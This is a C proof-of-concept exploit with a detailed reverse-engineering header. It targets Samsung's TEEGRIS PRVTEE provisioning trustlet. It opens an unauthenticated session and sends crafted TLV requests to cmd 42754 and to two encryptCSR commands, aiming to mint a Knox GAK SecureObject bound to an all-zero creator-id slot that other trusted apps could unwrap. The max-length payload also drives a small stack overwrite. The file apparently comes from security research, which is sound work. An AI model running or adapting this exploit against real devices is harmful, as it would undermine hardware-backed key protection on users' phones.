/*
 * prvtee (PRVTEE / Samsung Knox "DEVROOT#PROV" DRK provisioning trustlet) —
 * creator-id-2 zero-slot  ->  GAK-SO (GateKeeper/Generic-Auth-Key Secure
 * Object) forge.
 *
 * FINDING (headline): GAK SecureObject forge via the all-zero creator-id-2 ACL
 *   slot. SEVERITY: MED (NEEDS-RUNTIME-CONFIRMATION).
 *
 * CITATION (RE/samsung_teegris/prvtee.md):
 *   - cmd table line ~99-105: cmd 42754 / 0xA702 -> prvtee_unwrapGakBlob
 *     (@0x187EC), the handler that *mints* the GAK SecureObject; cmds
 *     43011 / 0xA803 (encryptCSR @0x18B8C) and 43012 / 0xA804
 *     (encryptCSR_variant_B @0x19310) reach the SHARED body at 0x18BEC via
 *     the two trampolines W0=1 / W0=2 (lines 219, 225).
 *   - line 138-141: unwrapGakBlob re-wraps the decrypted GAK "as a
 *     SecureObject via sub_247FC (prv_createSecureObject) with creator-id 2
 *     (set by sub_23A18(2) + sub_23A74(2))".
 *   - line 219/225: the encryptCSR body @0x18BEC "selects the SecureObject
 *     creator-id via sub_23A18(W0)" and enforces "(W0-1)>1 -> 'Not supported
 *     AppId'", so {1,2} are the only accepted AppIds: W0=1 (cmd 43011) binds
 *     creator-id-1 (SKM), W0=2 (cmd 43012) selects the SAME zero creator-id-2
 *     slot the GAK path uses.
 *   - lines 311-343 (SecureObject creator-id trust model): creator-id table
 *     entry a1=2 at unk_63E8+1088 is ALL-ZERO on this build; sub_247FC at
 *     0x18AF8 passes that zero TID to TEES_WrapSecureObject. "A zero/empty TID
 *     creates an SO with no creator binding -- any TA can unwrap it." -> GAK
 *     forge, severity MED IF the slot is still zero at runtime (line 340-343).
 *   - LOW (also documented, BENIGN): line 345-354 -- prvtee_unwrapGakBlob /
 *     sub_4BD98 SWBC decrypt does memcpy(a3, v15, n) with n<=0x4000 into
 *     v28[16380], a 4-byte over-write into stack padding [xbp-0xC,xbp-0x8).
 *     The canary v29 at [xbp-0x8] is untouched; the overrun lands in dead
 *     padding -> NOT exploitable. This PoC's max-length tag-6 body is what
 *     drives that 4-byte write, so the LOW is reached on the same wire.
 *
 * WIRE (RE lines 79-85, identical to SKM; TLV codec src/common/TLV.c):
 *   params[0] = single MEMREF_INOUT;  (param_types & 0xF) == 7  (line 85).
 *   buffer layout:
 *       [u32 cmd_id]
 *       [u32 payload_len]
 *       [u8  payload[]]        // Samsung-TLV: 0xFE sentinel, then
 *                              //   <tag:u8><len:u16(LE)><value>  records
 *   prvtee_unwrapGakBlob fetches (RE lines 117-118):
 *       tag 2  -> 16-byte IV   (panics "Invalid IV length %d." otherwise)
 *       tag 6  -> GAK blob     (length <= 0x4000)
 *
 * TRIGGER: open a PUBLIC-login session (TA_OpenSessionEntryPoint takes no
 *   caller check, line 73), then InvokeCommand(42754) with the TLV above. The
 *   unwrap of a SWBC-protected GAK blob ends in prv_createSecureObject binding
 *   the result to the zero creator-id-2 slot -> a GAK SO with no inter-TA ACL,
 *   forgeable/unwrappable by any peer. We also include the 43011 (W0=1) and
 *   43012 (W0=2) trampoline invocations to demonstrate, on the wire, that the
 *   same zero creator-id-2 slot is selected by the encryptCSR variant (W0=2).
 *
 * GATE / REPRO-STATUS: DEVICE-ONLY / NEEDS-RUNTIME (per RE/emulation/prvtee.md):
 *   1. The forge PRIMITIVE -- TEES_WrapSecureObject -- is UN-implemented in
 *      the emulator (routes to default_func -> HALT). Even granting an open
 *      ACL, there is no modeled path to mint the forged SO
 *      (RE/emulation/prvtee.md lines 102-121).
 *   2. The zero-slot is a per-device PROVISIONING / .data.rel.ro relocation
 *      property, not a behaviour the emulator decides
 *      (RE/emulation/prvtee.md lines 74-85, 146).
 *   3. The corpus emulator binary (S921BXXS9BYH20Y0) is the SAME SIZE
 *      (354,826 B) but NOT byte-identical to the RE build: in the corpus
 *      image vaddr 0x63E8 is rodata (.data.rel.ro is seg2 @0x4fec0) and the
 *      inline-ASCII creator-id table at the RE offset does not exist, so the
 *      per-offset addresses above (unk_63E8+1088, sub_4BD98, 0x18AF8) do NOT
 *      transfer to this build (RE/emulation/prvtee.md lines 36-85). The TA
 *      LOADS + boots (EMU_READY 2s) and the feature strings
 *      (TEES_WrapSecureObject / "Invalid secure object creator" /
 *      unwrapGakBlob / swbc_prov.c) are all present, so this PoC exercises the
 *      real GAK wire path; the forge consequence is what stays un-demonstrable
 *      here, not the code's presence.
 *
 *   => This PoC drives the GAK-SO wire request that, on a production device
 *      whose creator-id-2 slot ships zero, mints an unbound (forgeable) GAK
 *      SecureObject. On the emulator it reaches the handler but the
 *      WrapSecureObject sink halts; on a real device it would return a GAK SO
 *      consumable by any peer (e.g. VLTKPR / Knox Vault, RE line 140-141).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*, TEEC_Session*, const TEEC_UUID*,
                                     uint32_t, const void*, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*, uint32_t, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337"); system("ipcrm -M 0x13338");
    system("ipcrm -M 0x13339"); system("ipcrm -M 0x1333a");
#endif
}

/* --- PRVTEE wire constants, all grounded in RE/samsung_teegris/prvtee.md --- */
#define CMD_UNWRAP_GAK_BLOB 42754u   /* 0xA702 — mints GAK SO @ creator-id-2 (line 101,138-141) */
#define CMD_ENCRYPT_CSR     43011u   /* 0xA803 — trampoline W0=1, creator-id-1=SKM (line 102,219,225) */
#define CMD_ENCRYPT_CSR_B   43012u   /* 0xA804 — trampoline W0=2, SAME zero creator-id-2 (line 103,225) */

#define TLV_SENTINEL  0xFE           /* Samsung-TLV buffer must start with 0xFE (line 72,106) */
#define TLV_TAG_IV    2              /* unwrapGakBlob tag 2 = 16-byte IV (line 117) */
#define TLV_TAG_GAK   6              /* unwrapGakBlob tag 6 = GAK blob, len<=0x4000 (line 118) */
#define GAK_IV_LEN    16             /* "Invalid IV length" panic enforces exactly 16 (line 117) */
#define GAK_BLOB_MAX  0x4000         /* tag-6 body bound (line 118); also the LOW 4-byte-overflow driver */

/* request buffer = [u32 cmd_id][u32 payload_len][TLV payload].
 * Sized generously to hold the header + a max-length (0x4000) tag-6 body. */
#define REQ_SZ        0x5000

/* Append one Samsung-TLV record <tag:u8><len:u16 LE><value> at *pp; advance *pp. */
static void tlv_put(uint8_t **pp, uint8_t tag, uint16_t len, const uint8_t *val)
{
    uint8_t *p = *pp;
    *p++ = tag;
    p[0] = (uint8_t)(len & 0xFF);          /* len is u16 little-endian */
    p[1] = (uint8_t)((len >> 8) & 0xFF);
    p += 2;
    if (len && val) memcpy(p, val, len);
    else if (len)   memset(p, 0x41, len);  /* content irrelevant to the ACL-binding path */
    p += len;
    *pp = p;
}

/* Build [u32 cmd_id][u32 payload_len][0xFE][tag2 IV][tag6 GAK]. Returns total bytes. */
static uint32_t build_gak_request(uint8_t *buf, uint32_t cmd_id, uint16_t gak_len)
{
    uint8_t iv[GAK_IV_LEN];
    memset(iv, 0x00, sizeof(iv));          /* 16-byte IV — exact length is what the panic checks */

    uint8_t *payload = buf + 8;            /* TLV payload starts after the 8-byte header */
    uint8_t *p = payload;
    *p++ = TLV_SENTINEL;                   /* 0xFE */
    tlv_put(&p, TLV_TAG_IV,  GAK_IV_LEN, iv);
    tlv_put(&p, TLV_TAG_GAK, gak_len,    NULL);   /* attacker-controlled GAK blob (filled 0x41) */

    uint32_t payload_len = (uint32_t)(p - payload);
    memcpy(buf + 0, &cmd_id,      4);      /* [u32 cmd_id]     */
    memcpy(buf + 4, &payload_len, 4);      /* [u32 payload_len] */
    return 8 + payload_len;
}

static void invoke(TEEC_Context *ctx, TEEC_Session *s,
                   uint32_t cmd_id, uint16_t gak_len, const char *label)
{
    /* single MEMREF_TEMP_INOUT in params[0]; low nibble == 7 (RE line 85). */
    uint8_t *in = (uint8_t*)allocate_param_mem(ctx, REQ_SZ);
    if (!in) { printf("[poc] alloc failed\n"); exit(-1); }
    memset(in, 0, REQ_SZ);

    uint32_t total = build_gak_request(in, cmd_id, gak_len);

    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_NONE,
                                     TEEC_NONE, TEEC_NONE);   /* == 0x7, low nibble 7 */
    op.params[0].tmpref.buffer = in;
    op.params[0].tmpref.size   = REQ_SZ;   /* buffer holds the [cmd_id][len][TLV] request */

    uint32_t eo = 0;
    printf("[poc] >>> %s: cmd %u (0x%X), TLV payload %u bytes (tag2 IV=16, tag6 GAK=%u)\n",
           label, cmd_id, cmd_id, total - 8, gak_len);
    TEEC_Result res = TEEC_InvokeCommand_impl(s, cmd_id, &op, &eo);
    printf("[poc] <<< cmd %u returned 0x%x (origin 0x%x)\n", cmd_id, res, eo);
}

int main(void)
{
    /* prvtee — UUID ASCII tail "PRVTEE" (RE/samsung_teegris/prvtee.md line 3). */
    char* ta = "00000000-0000-0000-0000-505256544545";
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;

    cleanup_shm();
    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitializeContext failed 0x%x\n", res); exit(-1); }

    /* PUBLIC login — no credentials. TA_OpenSessionEntryPoint has no caller
     * check; it only writes the DEVROOT#PROV banner (RE line 73). */
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                                NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("OpenSession failed 0x%x origin 0x%x\n", res, err_origin);
        TEEC_FinalizeContext_impl(&context); exit(-1);
    }
    printf("[poc] session opened to prvtee (PUBLIC login, no creds)\n");

    /* (1) THE FORGE: cmd 42754 unwrapGakBlob mints the GAK SecureObject and
     *     binds it to the all-zero creator-id-2 slot (RE lines 138-141, 331-343).
     *     Max-length (0x4000) tag-6 body also drives the LOW 4-byte stack
     *     over-write into dead padding (RE lines 345-354, documented benign).
     *     On a device with a zero creator-id-2 slot this returns an unbound,
     *     forgeable GAK SO; on the emulator the WrapSecureObject sink halts. */
    invoke(&context, &session, CMD_UNWRAP_GAK_BLOB, GAK_BLOB_MAX,
           "FORGE GAK SecureObject (zero creator-id-2)");

    /* (2) Trampoline context: cmd 43012 encryptCSR_variant_B drives W0=2 into
     *     the shared body @0x18BEC, where sub_23A18(W0=2) selects the SAME zero
     *     creator-id-2 binding (RE lines 219, 225, 322). 43011 (W0=1) below
     *     selects creator-id-1 (SKM) for contrast. */
    invoke(&context, &session, CMD_ENCRYPT_CSR_B, 0x40,
           "encryptCSR variant_B (W0=2 -> same zero creator-id-2 slot)");
    invoke(&context, &session, CMD_ENCRYPT_CSR, 0x40,
           "encryptCSR (W0=1 -> creator-id-1 = SKM, for contrast)");

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
